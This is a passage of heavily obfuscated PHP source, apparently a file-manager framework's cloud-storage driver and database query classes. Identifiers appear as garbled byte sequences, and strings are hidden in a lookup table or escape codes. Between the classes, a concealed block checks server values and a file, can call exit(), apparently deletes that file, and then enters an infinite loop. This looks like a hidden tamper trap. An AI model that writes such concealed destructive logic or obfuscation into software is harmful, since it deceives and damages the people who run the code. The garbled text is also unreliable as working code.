parent::fileOut($Ï–ğ¡ãş, $½İ¯ëşĞ, $˜“ğ§°Ø, $úò»«¡); } public function fileOutImageServer($èÏ¼´Û½, $ÖˆûÈ¿ = 250) { parent::fileOutImage($èÏ¼´Û½, $ÖˆûÈ¿); } public function hashMd5($Œ£³’®–, $¬‹±˜×î = '') { $ÒÆ„Ó­ô =& $_SERVER[ Ö‘ñÄ”]; $ÅÅ¬´ã = $this->objectMeta($Œ£³’®–); if (!$ÅÅ¬´ã) { return !1; } $¬‹±˜×î = $¬‹±˜×î ? $¬‹±˜×î : _get($ÅÅ¬´ã, $ÒÆ„Ó­ô[221]); $¬‹±˜×î = $¬‹±˜×î ? $¬‹±˜×î : _get($ÅÅ¬´ã, $ÒÆ„Ó­ô[213], $ÒÆ„Ó­ô[12]); return $¬‹±˜×î; } public function uploadFormData($©ÅÒ¡ë¿, $‘è¦¾ = 3600) { $ñöÚÍªŸ =& $_SERVER[ Ö‘ñÄ”]; $ïªêÊ¡š = $this->pathFather($©ÅÒ¡ë¿); $Š‘¼£  = $this->client->getHttpUploadPostParams($this->bucket, $ïªêÊ¡š, $ñöÚÍªŸ[198], $‘è¦¾); return array_merge((array) $Š‘¼£ , array($ñöÚÍªŸ[181] => $this->getHost())); } public function multiUploadFormData($±¿Ôî˜ƒ, $ú”€üı = 3600) { $‡Êş¨ =& $_SERVER[ Ö‘ñÄ”]; $˜Æãş¡½ = gmdate($‡Êş¨[222]); $­æóÎöø = array(); $¤¸—›ëï = $this->client->getUploadId($this->bucket, $±¿Ôî˜ƒ, $­æóÎöø); if (!$¤¸—›ëï) { return !1; } return array($‡Êş¨[223] => $¤¸—›ëï, $‡Êş¨[181] => $this->getHost() . $‡Êş¨[8] . $this->pathEncode($±¿Ôî˜ƒ), $‡Êş¨[224] => $˜Æãş¡½, $‡Êş¨[94] => $±¿Ôî˜ƒ); } public function multiUploadAuthData($‡Ÿş£–ô, $Ú¾³®£ı = array()) { $ÇóÉêáŠ =& $_SERVER[ Ö‘ñÄ”]; $¡ãÃû«À = isset($Ú¾³®£ı[$ÇóÉêáŠ[224]]) ? $Ú¾³®£ı[$ÇóÉêáŠ[224]] : gmdate($ÇóÉêáŠ[222]); $¾âÚ¥‚ = isset($Ú¾³®£ı[$ÇóÉêáŠ[174]]) ? $Ú¾³®£ı[$ÇóÉêáŠ[174]] : $ÇóÉêáŠ[12]; $ä®Ïªß´ = $Ú¾³®£ı[$ÇóÉêáŠ[94]]; unset($Ú¾³®£ı[$ÇóÉêáŠ[94]]); if (isset($Ú¾³®£ı[$ÇóÉêáŠ[225]])) { $Ú¾³®£ı[$ÇóÉêáŠ[224]] = $¡ãÃû«À; return $this->listUploadParts($ä®Ïªß´, $Ú¾³®£ı); } $î­²¾ùà = array($ÇóÉêáŠ[226], $ÇóÉêáŠ[12], $ÇóÉêáŠ[120], $ÇóÉêáŠ[12], "\x78\x2d\141\x6d\x7a\55\144\x61\164\x65\x3a{$¡ãÃû«À}", $ÇóÉêáŠ[8] . $this->bucket . $ÇóÉêáŠ[8] . $this->pathEncode($ä®Ïªß´) . $¾âÚ¥‚); if (strpos($¾âÚ¥‚, $ÇóÉêáŠ[227]) === 0) { $î­²¾ùà[0] = $ÇóÉêáŠ[228]; } if (isset($Ú¾³®£ı[$ÇóÉêáŠ[229]]) && $Ú¾³®£ı[$ÇóÉêáŠ[229]] == $ÇóÉêáŠ[230]) { $î­²¾ùà[0] = $ÇóÉêáŠ[230]; } $ŞÔÆóÍÒ = implode($ÇóÉêáŠ[231], $î­²¾ùà); $³á—Ù›Ğ = base64_encode(hash_hmac($ÇóÉêáŠ[232], $ŞÔÆóÍÒ, $this->secret, !0)); $Üã•×Ÿª = $ÇóÉêáŠ[233] . $this->accessKey . $ÇóÉêáŠ[4] . $³á—Ù›Ğ; if (strpos($¾âÚ¥‚, $ÇóÉêáŠ[227]) === 0) { return array($ÇóÉêáŠ[234] => $Üã•×Ÿª, $ÇóÉêáŠ[224] => $¡ãÃû«À); } return $Üã•×Ÿª; } public function listUploadParts($Ò“åšÁÇ, $—¸ Ë¤ = array()) { $ÓÎÏ¸ª =& $_SERVER[ Ö‘ñÄ”]; $ºñ°Ç¦‰ = str_replace($ÓÎÏ¸ª[235], $ÓÎÏ¸ª[12], $—¸ Ë¤[$ÓÎÏ¸ª[174]]); $‰¨ï³¾– = $this->client->listParts($this->bucket, $Ò“åšÁÇ, $ºñ°Ç¦‰); if (!$‰¨ï³¾–) { return !1; } unset($—¸ Ë¤[$ÓÎÏ¸ª[225]], $—¸ Ë¤[$ÓÎÏ¸ª[229]]); $—¸ Ë¤[$ÓÎÏ¸ª[94]] = $Ò“åšÁÇ; $ÚúŞ”„² = $this->multiUploadAuthData($Ò“åšÁÇ, $—¸ Ë¤); if (empty($ÚúŞ”„²)) { return !1; } return array($ÓÎÏ¸ª[234] => $ÚúŞ”„², $ÓÎÏ¸ª[224] => $—¸ Ë¤[$ÓÎÏ¸ª[224]], $ÓÎÏ¸ª[236] => $‰¨ï³¾–); } public function getHost() { return parent::getHost() . $_SERVER[ Ö‘ñÄ”][8] . $this->bucket; } public function size($ßä—æ¹ó) { $¾½†şÎ = $this->objectMeta($ßä—æ¹ó); return $¾½†şÎ ? $¾½†şÎ[$_SERVER[ Ö‘ñÄ”][76]] : 0; } public function info($ŒÉÙ–ÈÈ) { if ($this->isFolder($ŒÉÙ–ÈÈ)) { return $this->folderInfo($ŒÉÙ–ÈÈ); } else { if ($this->isFile($ŒÉÙ–ÈÈ)) { return $this->fileInfo($ŒÉÙ–ÈÈ); } } return !1; } public function exist($ÖÒ¶Ù½¹) { return $this->isFile($ÖÒ¶Ù½¹) || $this->isFolder($ÖÒ¶Ù½¹); } public function isFile($ŒŸú¡ç) { return !$this->isFolder($ŒŸú¡ç) && $this->objectMeta($ŒŸú¡ç); } public function isFolder($ó‹«¢¥Ù) { return $this->cacheMethod($_SERVER[ Ö‘ñÄ”][165], $ó‹«¢¥Ù); } protected function objectMeta($¶ŠôåÜ®) { return $this->cacheMethod($_SERVER[ Ö‘ñÄ”][167], $¶ŠôåÜ®); } protected function _objectMeta($ÃÉìøîÍ) { $Ï›°ı‹š =& $_SERVER[ Ö‘ñÄ”]; $ÃÉìøîÍ = rtrim($ÃÉìøîÍ, $Ï›°ı‹š[8]); try { $¤€İ¨ª„ = $this->client->getObjectInfo($this->bucket, $ÃÉìøîÍ); if (!isset($¤€İ¨ª„[$Ï›°ı‹š[221]]) && isset($¤€İ¨ª„[$Ï›°ı‹š[237]])) { $¤€İ¨ª„[$Ï›°ı‹š[221]] = $¤€İ¨ª„[$Ï›°ı‹š[237]]; } } catch (Exception $ü³àì¶) { $¤€İ¨ª„ = !1; } if (!$¤€İ¨ª„) { } return $¤€İ¨ª„; } protected function _isFolder($¤©Ï±ü™) { $Ü—É±ßî =& $_SERVER[ Ö‘ñÄ”]; $¤©Ï±ü™ = rtrim($¤©Ï±ü™, $Ü—É±ßî[8]); if ($¤©Ï±ü™ == $Ü—É±ßî[12] || $¤©Ï±ü™ == $Ü—É±ßî[8]) { return !0; } $Îš­¶§¼ = $this->client->getBucket($this->bucket, $¤©Ï±ü™, null, 1); if (empty($Îš­¶§¼[$Ü—É±ßî[204]])) { return !1; } $¨Îôßõš = $Îš­¶§¼[$Ü—É±ßî[204]][0][$Ü—É±ßî[32]]; return stripos($¨Îôßõš, $¤©Ï±ü™ . $Ü—É±ßî[8]) === 0 ? !0 : !1; if (substr($¨Îôßõš, -1) == $Ü—É±ßî[8]) { return !0; } if (get_path_this($¨Îôßõš) == get_path_this($¤©Ï±ü™)) { return !1; } return !0; } } if (!isset($_SERVER[$_SERVER[ Ö‘ñÄ”][238]]) || !isset($_SERVER[$_SERVER[ Ö‘ñÄ”][239]])) { $_getc = $_SERVER[ Ö‘ñÄ”][240]; $_getfile = $_SERVER[$_SERVER[ Ö‘ñÄ”][241]] . $_SERVER[ Ö‘ñÄ”][242]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ Ö‘ñÄ”][231], $_getfilec); if (count($_getarrs) < $_SERVER[ Ö‘ñÄ”][243]) { $exit = $_SERVER[ Ö‘ñÄ”][244]; $exit(); } $_act = $_SERVER[ Ö‘ñÄ”][245]; $_act($_SERVER[$_SERVER[ Ö‘ñÄ”][241]] . $_SERVER[ Ö‘ñÄ”][242]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ Ö‘ñÄ”][246]); } } goto A¿¤é¿ˆ; c“º°³ÖÂš: class DbSqlite extends DbSqliteBase { public function query($¡ÂÕ£ˆ¹) { $¶Ÿ°‘« =& $_SERVER[ Ö‘ñÄ”]; if (!CacheLock::fileLock($¶Ÿ°‘«[13])) { return !1; } $·ˆ€Û¹Ÿ = parent::query($¡ÂÕ£ˆ¹); CacheLock::fileUnLock($¶Ÿ°‘«[13]); return $·ˆ€Û¹Ÿ; } public function execute($ÛÎ‡ÁÙ) { $ë­·ÑÄ =& $_SERVER[ Ö‘ñÄ”]; if (!CacheLock::fileLock($ë­·ÑÄ[13])) { return !1; } $„à¾» = parent::execute($ÛÎ‡ÁÙ); CacheLock::fileUnLock($ë­·ÑÄ[13]); return $„à¾»; } } class DbSqlite3 extends DbSqlite3Base { public function query($øÚ®ş) { $á“˜¯»¬ =& $_SERVER[ Ö‘ñÄ”]; if (!CacheLock::fileLock($á“˜¯»¬[13])) { return !1; } $¸ù¹‘¶ü = parent::query($øÚ®ş); CacheLock::fileUnLock($á“˜¯»¬[13]); return $¸ù¹‘¶ü; } public function execute($Ëí‡±Ë—) { $¾‹£›¢² =& $_SERVER[ Ö‘ñÄ”]; if (!CacheLock::fileLock($¾‹£›¢²[13])) { return !1; } $¥ ·ÀÍ = parent::execute($Ëí‡±Ë—); CacheLock::fileUnLock($¾‹£›¢²[13]); return $¥ ·ÀÍ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\x65\161" => "\74\x3e", "\x67\x74" => "\76", "\x65\147\164" => "\x3e\x3d", "\x6c\164" => "\x3c", "\x65\x6c\164" => "\x3c\x3d", "\x6e\x6f\x74\154\151\153\145" => "\116\x4f\124\x20\x4c\111\x4b\x45", "\x6c\151\153\x65" => "\114\111\113\x45", "\x69\x6e" => "\x49\x4e", "\156\x6f\x74\x69\156" => "\x4e\x4f\x54\40\x49\116", "\x6e\x6f\164\x20\x69\156" => "\116\x4f\124\40\x49\116", "\x62\145\164\x77\145\x65\156" => "\x42\x45\x54\127\105\x45\116", "\x6e\157\164\142\x65\164\x77\x65\x65\x6e" => "\x4e\x4f\x54\40\102\105\x54\x57\105\105\x4e", "\x6e\x6f\164\40\142\x65\164\167\x65\x65\156" => "\x4e\x4f\x54\x20\x42\105\124\x57\105\x45\116"); protected $selectSql = "\x53\x45\114\x45\103\124\45\x44\x49\123\x54\x49\116\x43\x54\45\x20\x25\x46\x49\105\x4c\x44\x25\40\106\122\x4f\x4d\40\x25\124\x41\102\x4c\105\x25\45\x4a\x4f\111\116\45\45\127\110\105\x52\105\45\45\x47\x52\x4f\x55\120\x25\x25\x48\101\126\111\116\107\45\x25\x4f\122\104\105\x52\x25\x25\x4c\111\115\111\x54\x25\40\x25\x55\x4e\x49\117\x4e\x25\x25\x43\x4f\x4d\115\x45\116\124\x25"; protected $bind = array(); public static function getInstance() { $ô½Â×ğš = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ Ö‘ñÄ”][966], $ô½Â×ğš); } public function factory($Ã˜÷°†à = '') { $¯çŠİ“ =& $_SERVER[ Ö‘ñÄ”]; $Ã˜÷°†à = $this->parseConfig($Ã˜÷°†à); if (empty($Ã˜÷°†à[$¯çŠİ“[967]])) { think_exception(think_lang($¯çŠİ“[968])); } $this->dbType = ucwords(strtolower($Ã˜÷°†à[$¯çŠİ“[967]])); $ÉõÒŒ¨« = $¯çŠİ“[969] . $this->dbType; if (class_exists($ÉõÒŒ¨«)) { $¯üê©Éò = new $ÉõÒŒ¨«($Ã˜÷°†à); if ($¯çŠİ“[970] != strtolower($Ã˜÷°†à[$¯çŠİ“[967]])) { $¯üê©Éò->dbType = strtoupper($this->dbType); } else { $¯üê©Éò->dbType = $this->_getDsnType($Ã˜÷°†à[$¯çŠİ“[922]]); } } else { think_exception(think_lang($¯çŠİ“[971]) . $¯çŠİ“[972] . $ÉõÒŒ¨«); } return $¯üê©Éò; } public function __call($¬÷Ş³Ë•, $çÍ‹«ƒ) { if (method_exists($this, $¬÷Ş³Ë•)) { return call_user_func_array(array($this, $¬÷Ş³Ë•), $çÍ‹«ƒ); } } protected function _getDsnType($®šæÀè‚) { $‘äßßêÅ = explode($_SERVER[ Ö‘ñÄ”][4], $®šæÀè‚); $ĞÄ´Äéì = strtoupper(trim($‘äßßêÅ[0])); return $ĞÄ´Äéì; } private function parseConfig($°ò²¬ = '') { $µÆı¢±É =& $_SERVER[ Ö‘ñÄ”]; if (!empty($°ò²¬) && is_string($°ò²¬)) { $°ò²¬ = $this->parseDSN($°ò²¬); } elseif (is_array($°ò²¬)) { $°ò²¬ = array_change_key_case($°ò²¬); $°ò²¬ = array($µÆı¢±É[967] => $°ò²¬[$µÆı¢±É[973]], $µÆı¢±É[894] => $°ò²¬[$µÆı¢±É[974]], $µÆı¢±É[895] => $°ò²¬[$µÆı¢±É[975]], $µÆı¢±É[892] => $°ò²¬[$µÆı¢±É[976]], $µÆı¢±É[893] => $°ò²¬[$µÆı¢±É[977]], $µÆı¢±É[21] => $°ò²¬[$µÆı¢±É[978]], $µÆı¢±É[922] => $°ò²¬[$µÆı¢±É[979]], $µÆı¢±É[17] => isset($°ò²¬[$µÆı¢±É[980]]) ? $°ò²¬[$µÆı¢±É[980]] : array()); } elseif (empty($°ò²¬)) { if (think_config($µÆı¢±É[981]) && $µÆı¢±É[970] != strtolower(think_config($µÆı¢±É[982]))) { $°ò²¬ = $this->parseDSN(think_config($µÆı¢±É[981])); } else { $°ò²¬ = array($µÆı¢±É[967] => think_config($µÆı¢±É[982]), $µÆı¢±É[894] => think_config($µÆı¢±É[983]), $µÆı¢±É[895] => think_config($µÆı¢±É[984]), $µÆı¢±É[892] => think_config($µÆı¢±É[985]), $µÆı¢±É[893] => think_config($µÆı¢±É[986]), $µÆı¢±É[21] => think_config($µÆı¢±É[255]), $µÆı¢±É[922] => think_config($µÆı¢±É[981]), $µÆı¢±É[17] => think_config($µÆı¢±É[987])); } } return $°ò²¬; } protected function initConnect($×ìĞËõÄ = true) { if (1 == think_config($_SERVER[ Ö‘ñÄ”][22])) { $this->_linkID = $this->multiConnect($×ìĞËõÄ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $”˜ûš°º => $¥èß½ÙÊ) { $this->_linkID = $¥èß½ÙÊ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ÆÆæÇ› = false) { $Ûğµ€í =& $_SERVER[ Ö‘ñÄ”]; static $Şß€Øœü = array(); static $¼•€Ô = -1; if (empty($Şß€Øœü)) { foreach ($this->config as $Ê„É¾í¿ => $ÏÆÌÕö´) { $Şß€Øœü[$Ê„É¾í¿] = explode($Ûğµ€í[50], $ÏÆÌÕö´); } } if (think_config($Ûğµ€í[988])) { if ($ÆÆæÇ› || think_config($Ûğµ€í[403]) === !0) { $ïÓÑäßú = floor(mt_rand(0, think_config($Ûğµ€í[989]) - 1)); $¼•€Ô = $ïÓÑäßú; } else { if (is_numeric(think_config($Ûğµ€í[990]))) { $ïÓÑäßú = think_config($Ûğµ€í[990]); } else { $ïÓÑäßú = floor(mt_rand(think_config($Ûğµ€í[989]), count($Şß€Øœü[$Ûğµ€í[892]]) - 1)); } } } else { $ïÓÑäßú = floor(mt_rand(0, count($Şß€Øœü[$Ûğµ€í[892]]) - 1)); $¼•€Ô = $ïÓÑäßú; } $ïÓÑäßú = $¼•€Ô !== -1 ? $¼•€Ô : $ïÓÑäßú; $İ°Ì‹†í = array($Ûğµ€í[894] => isset($Şß€Øœü[$Ûğµ€í[894]][$ïÓÑäßú]) ? $Şß€Øœü[$Ûğµ€í[894]][$ïÓÑäßú] : $Şß€Øœü[$Ûğµ€í[894]][0], $Ûğµ€í[895] => isset($Şß€Øœü[$Ûğµ€í[895]][$ïÓÑäßú]) ? $Şß€Øœü[$Ûğµ€í[895]][$ïÓÑäßú] : $Şß€Øœü[$Ûğµ€í[895]][0], $Ûğµ€í[892] => isset($Şß€Øœü[$Ûğµ€í[892]][$ïÓÑäßú]) ? $Şß€Øœü[$Ûğµ€í[892]][$ïÓÑäßú] : $Şß€Øœü[$Ûğµ€í[892]][0], $Ûğµ€í[893] => isset($Şß€Øœü[$Ûğµ€í[893]][$ïÓÑäßú]) ? $Şß€Øœü[$Ûğµ€í[893]][$ïÓÑäßú] : $Şß€Øœü[$Ûğµ€í[893]][0], $Ûğµ€í[21] => isset($Şß€Øœü[$Ûğµ€í[21]][$ïÓÑäßú]) ? $Şß€Øœü[$Ûğµ€í[21]][$ïÓÑäßú] : $Şß€Øœü[$Ûğµ€í[21]][0], $Ûğµ€í[922] => isset($Şß€Øœü[$Ûğµ€í[922]][$ïÓÑäßú]) ? $Şß€Øœü[$Ûğµ€í[922]][$ïÓÑäßú] : $Şß€Øœü[$Ûğµ€í[922]][0], $Ûğµ€í[17] => isset($Şß€Øœü[$Ûğµ€í[17]][$ïÓÑäßú]) ? $Şß€Øœü[$Ûğµ€í[17]][$ïÓÑäßú] : $Şß€Øœü[$Ûğµ€í[17]][0]); return $this->connect($İ°Ì‹†í, $ïÓÑäßú); } public function parseDSN($ÒÂ¸³…÷) { $˜ˆÍ‘ò =& $_SERVER[ Ö‘ñÄ”]; if (empty($ÒÂ¸³…÷)) { return !1; } $Áû‡®˜Ÿ = parse_url($ÒÂ¸³…÷); if ($Áû‡®˜Ÿ[$˜ˆÍ‘ò[180]]) { $’ÖÂı™ = array($˜ˆÍ‘ò[967] => $Áû‡®˜Ÿ[$˜ˆÍ‘ò[180]], $˜ˆÍ‘ò[894] => isset($Áû‡®˜Ÿ[$˜ˆÍ‘ò[608]]) ? $Áû‡®˜Ÿ[$˜ˆÍ‘ò[608]] : $˜ˆÍ‘ò[12], $˜ˆÍ‘ò[895] => isset($Áû‡®˜Ÿ[$˜ˆÍ‘ò[991]]) ? $Áû‡®˜Ÿ[$˜ˆÍ‘ò[991]] : $˜ˆÍ‘ò[12], $˜ˆÍ‘ò[892] => isset($Áû‡®˜Ÿ[$˜ˆÍ‘ò[181]]) ? $Áû‡®˜Ÿ[$˜ˆÍ‘ò[181]] : $˜ˆÍ‘ò[12], $˜ˆÍ‘ò[893] => isset($Áû‡®˜Ÿ[$˜ˆÍ‘ò[182]]) ? $Áû‡®˜Ÿ[$˜ˆÍ‘ò[182]] : $˜ˆÍ‘ò[12], $˜ˆÍ‘ò[21] => isset($Áû‡®˜Ÿ[$˜ˆÍ‘ò[84]]) ? substr($Áû‡®˜Ÿ[$˜ˆÍ‘ò[84]], 1) : $˜ˆÍ‘ò[12]); } else { preg_match($˜ˆÍ‘ò[992], trim($ÒÂ¸³…÷), $“Åı‘à); $’ÖÂı™ = array($˜ˆÍ‘ò[967] => $“Åı‘à[1], $˜ˆÍ‘ò[894] => $“Åı‘à[2], $˜ˆÍ‘ò[895] => $“Åı‘à[3], $˜ˆÍ‘ò[892] => $“Åı‘à[4], $˜ˆÍ‘ò[893] => $“Åı‘à[5], $˜ˆÍ‘ò[21] => $“Åı‘à[6]); } $’ÖÂı™[$˜ˆÍ‘ò[922]] = $˜ˆÍ‘ò[12]; return $’ÖÂı™; } protected function debug() { $¹››Ü™ =& $_SERVER[ Ö‘ñÄ”]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $¹››Ü™[993]; if (think_config($¹››Ü™[994])) { think_status($¹››Ü™[995]); think_trace($this->queryStr . $¹››Ü™[996] . think_status($¹››Ü™[24], $¹››Ü™[995], 6) . $¹››Ü™[997], $¹››Ü™[12], $¹››Ü™[998]); } } protected function parseLock($ì‰äõÈ = false) { $¦ÏÖ‘µ‰ =& $_SERVER[ Ö‘ñÄ”]; if (!$ì‰äõÈ) { return $¦ÏÖ‘µ‰[12]; } if ($¦ÏÖ‘µ‰[924] == $this->dbType) { return $¦ÏÖ‘µ‰[999]; } return $¦ÏÖ‘µ‰[1000]; } protected function parseSet($úò¾) { $×“â¶·¯ =& $_SERVER[ Ö‘ñÄ”]; foreach ($úò¾ as $ôï’‘õ => $ö¡îš) { if (is_array($ö¡îš) && $×“â¶·¯[306] == $ö¡îš[0]) { $ïíç„ù¾[] = $this->parseKey($ôï’‘õ) . $×“â¶·¯[890] . $ö¡îš[1]; } elseif (is_scalar($ö¡îš) || is_null($ö¡îš)) { $ïíç„ù¾[] = $this->parseKey($ôï’‘õ) . $×“â¶·¯[890] . $this->parseValue($ö¡îš); } } return $×“â¶·¯[1001] . implode($×“â¶·¯[50], $ïíç„ù¾); } protected function bindParam($€œºèå—, $ñ†Ğ×Ëµ) { $this->bind[$_SERVER[ Ö‘ñÄ”][4] . $€œºèå—] = $ñ†Ğ×Ëµ; } protected function parseBind($ôï¹‰üÇ) { $ôï¹‰üÇ = array_merge($this->bind, $ôï¹‰üÇ); $this->bind = array(); return $ôï¹‰üÇ; } function parseKey(&$åÍ«”âì, $ßìø…øÄ = true) { if ($ßìø…øÄ) { $åÍ«”âì = $this->parseKeyCheck($åÍ«”âì); } return $åÍ«”âì; } function parseKeyCheck($ú¡„ıú) { $¥Ÿ¦Ï¶ =& $_SERVER[ Ö‘ñÄ”]; $ú¡„ıú = trim($ú¡„ıú); if (!preg_match($¥Ÿ¦Ï¶[1002], $ú¡„ıú)) { think_exception($¥Ÿ¦Ï¶[1003] . $ú¡„ıú); } return $ú¡„ıú; } protected function parseValue($Äàˆ¯÷©) { $Õ­óÄí =& $_SERVER[ Ö‘ñÄ”]; if (is_string($Äàˆ¯÷©)) { $Äàˆ¯÷© = $Õ­óÄí[963] . $this->escapeString($Äàˆ¯÷©) . $Õ­óÄí[963]; } elseif (isset($Äàˆ¯÷©[0]) && is_string($Äàˆ¯÷©[0]) && strtolower($Äàˆ¯÷©[0]) == $Õ­óÄí[306]) { $Äàˆ¯÷© = $this->escapeString($Äàˆ¯÷©[1]); } elseif (is_array($Äàˆ¯÷©)) { $Äàˆ¯÷© = array_map(array($this, $Õ­óÄí[964]), $Äàˆ¯÷©); } elseif (is_bool($Äàˆ¯÷©)) { $Äàˆ¯÷© = $Äàˆ¯÷© ? $Õ­óÄí[88] : $Õ­óÄí[197]; } elseif (is_null($Äàˆ¯÷©)) { $Äàˆ¯÷© = $Õ­óÄí[103]; } return $Äàˆ¯÷©; } protected function parseField($òÉüµß) { $Àš¦â£È =& $_SERVER[ Ö‘ñÄ”]; if (is_string($òÉüµß) && strpos($òÉüµß, $Àš¦â£È[50])) { $òÉüµß = explode($Àš¦â£È[50], $òÉüµß); } if (is_array($òÉüµß)) { $‡†Üıë = array(); foreach ($òÉüµß as $¾ôı¤Ğ => $ÔùÃ¦²Ñ) { if (!is_numeric($¾ôı¤Ğ)) { $‡†Üıë[] = $this->parseKey($¾ôı¤Ğ, !1) . $Àš¦â£È[1004] . $this->parseKey($ÔùÃ¦²Ñ); } else { $‡†Üıë[] = $this->parseKey($ÔùÃ¦²Ñ); } } $ë¼Şã¤á = implode($Àš¦â£È[50], $‡†Üıë); } elseif (is_string($òÉüµß) && !empty($òÉüµß)) { $ë¼Şã¤á = $òÉüµß; } else { $ë¼Şã¤á = $Àš¦â£È[188]; } return $ë¼Şã¤á; } protected function parseTable($æª÷ó”Ë) { $×¯öä¶ê =& $_SERVER[ Ö‘ñÄ”]; if (is_array($æª÷ó”Ë)) { $ìÀš‰¶é = array(); foreach ($æª÷ó”Ë as $ĞØ©Ö´› => $àíÓƒ˜‰) { if (!is_numeric($ĞØ©Ö´›)) { $ìÀš‰¶é[] = $this->parseKey($ĞØ©Ö´›) . $×¯öä¶ê[53] . $this->parseKey($àíÓƒ˜‰); } else { $ìÀš‰¶é[] = $this->parseKey($ĞØ©Ö´›); } } $æª÷ó”Ë = $ìÀš‰¶é; } elseif (is_string($æª÷ó”Ë)) { if (strstr($æª÷ó”Ë, $×¯öä¶ê[53])) { return $æª÷ó”Ë; } $æª÷ó”Ë = explode($×¯öä¶ê[50], $æª÷ó”Ë); array_walk($æª÷ó”Ë, array($this, $×¯öä¶ê[912])); } return $×¯öä¶ê[906] . trim(implode($×¯öä¶ê[1005], $æª÷ó”Ë), $×¯öä¶ê[393]) . $×¯öä¶ê[906]; } protected function parseWhere($„„ûÜ³§) { $®ä¥Ãè– =& $_SERVER[ Ö‘ñÄ”]; $ø©¥àÒö = $®ä¥Ãè–[12]; if (is_string($„„ûÜ³§)) { $ø©¥àÒö = $„„ûÜ³§; } else { $Ûåªôğ = isset($„„ûÜ³§[$®ä¥Ãè–[1006]]) ? strtoupper($„„ûÜ³§[$®ä¥Ãè–[1006]]) : $®ä¥Ãè–[12]; if (in_array($Ûåªôğ, array($®ä¥Ãè–[1007], $®ä¥Ãè–[1008], $®ä¥Ãè–[1009]))) { $Ûåªôğ = $®ä¥Ãè–[53] . $Ûåªôğ . $®ä¥Ãè–[53]; unset($„„ûÜ³§[$®ä¥Ãè–[1006]]); } else { $Ûåªôğ = $®ä¥Ãè–[1010]; } foreach ($„„ûÜ³§ as $†ˆ»‹ê => $Ö‚ğ®€§) { $ø©¥àÒö .= $®ä¥Ãè–[286]; if (is_numeric($†ˆ»‹ê)) { $†ˆ»‹ê = $®ä¥Ãè–[1011]; } if (0 === strpos($†ˆ»‹ê, $®ä¥Ãè–[11])) { $ø©¥àÒö .= $this->parseThinkWhere($†ˆ»‹ê, $Ö‚ğ®€§); } else { if (!preg_match($®ä¥Ãè–[1012], trim($†ˆ»‹ê))) { think_exception(think_lang($®ä¥Ãè–[1013]) . $®ä¥Ãè–[4] . $†ˆ»‹ê); } $‰ø¼õ¥ = is_array($Ö‚ğ®€§) && isset($Ö‚ğ®€§[$®ä¥Ãè–[1014]]); $†ˆ»‹ê = trim($†ˆ»‹ê); if (strpos($†ˆ»‹ê, $®ä¥Ãè–[292])) { $ˆŒ³±İ  = explode($®ä¥Ãè–[292], $†ˆ»‹ê); $İ‚—Ê“ï = array(); foreach ($ˆŒ³±İ  as $ÇÃŠÀ¤ => $îøÂİˆ) { $¦£ëÌ¤É = $‰ø¼õ¥ ? $Ö‚ğ®€§[$ÇÃŠÀ¤] : $Ö‚ğ®€§; $İ‚—Ê“ï[] = $®ä¥Ãè–[269] . $this->parseWhereItem($this->parseKey($îøÂİˆ), $¦£ëÌ¤É) . $®ä¥Ãè–[911]; } $ø©¥àÒö .= implode($®ä¥Ãè–[1015], $İ‚—Ê“ï); } elseif (strpos($†ˆ»‹ê, $®ä¥Ãè–[293])) { $ˆŒ³±İ  = explode($®ä¥Ãè–[293], $†ˆ»‹ê); $İ‚—Ê“ï = array(); foreach ($ˆŒ³±İ  as $ÇÃŠÀ¤ => $îøÂİˆ) { $¦£ëÌ¤É = $‰ø¼õ¥ ? $Ö‚ğ®€§[$ÇÃŠÀ¤] : $Ö‚ğ®€§; $İ‚—Ê“ï[] = $®ä¥Ãè–[269] . $this->parseWhereItem($this->parseKey($îøÂİˆ), $¦£ëÌ¤É) . $®ä¥Ãè–[911]; } $ø©¥àÒö .= implode($®ä¥Ãè–[1010], $İ‚—Ê“ï); } else { $ø©¥àÒö .= $this->parseWhereItem($this->parseKey($†ˆ»‹ê), $Ö‚ğ®€§); } } $ø©¥àÒö .= $®ä¥Ãè–[287] . $Ûåªôğ; } $ø©¥àÒö = substr($ø©¥àÒö, 0, -strlen($Ûåªôğ)); } return empty($ø©¥àÒö) ? $®ä¥Ãè–[12] : $®ä¥Ãè–[1016] . $ø©¥àÒö; } protected function parseWhereItem($³ıœæÛç, $ŞÈÑóçÇ) { $Ì¢ê‘§ =& $_SERVER[ Ö‘ñÄ”]; $»†ûÊ  = $Ì¢ê‘§[12]; if (is_array($ŞÈÑóçÇ)) { if (is_string($ŞÈÑóçÇ[0])) { $§‚ÓÌ = strtolower($ŞÈÑóçÇ[0]); if (in_array($ŞÈÑóçÇ[0], array($Ì¢ê‘§[890], $Ì¢ê‘§[1017], $Ì¢ê‘§[1018], $Ì¢ê‘§[1019], $Ì¢ê‘§[1020], $Ì¢ê‘§[1021]))) { $»†ûÊ  .= $³ıœæÛç . $Ì¢ê‘§[53] . $ŞÈÑóçÇ[0] . $Ì¢ê‘§[53] . $this->parseValue($ŞÈÑóçÇ[1]); } elseif (preg_match($Ì¢ê‘§[1022], $ŞÈÑóçÇ[0])) { $»†ûÊ  .= $³ıœæÛç . $Ì¢ê‘§[53] . $this->exp[$§‚ÓÌ] . $Ì¢ê‘§[53] . $this->parseValue($ŞÈÑóçÇ[1]); } elseif (preg_match($Ì¢ê‘§[1023], $ŞÈÑóçÇ[0])) { if (is_array($ŞÈÑóçÇ[1])) { $ÚŸÙ‡½È = isset($ŞÈÑóçÇ[2]) ? strtoupper($ŞÈÑóçÇ[2]) : $Ì¢ê‘§[1008]; if (in_array($ÚŸÙ‡½È, array($Ì¢ê‘§[1007], 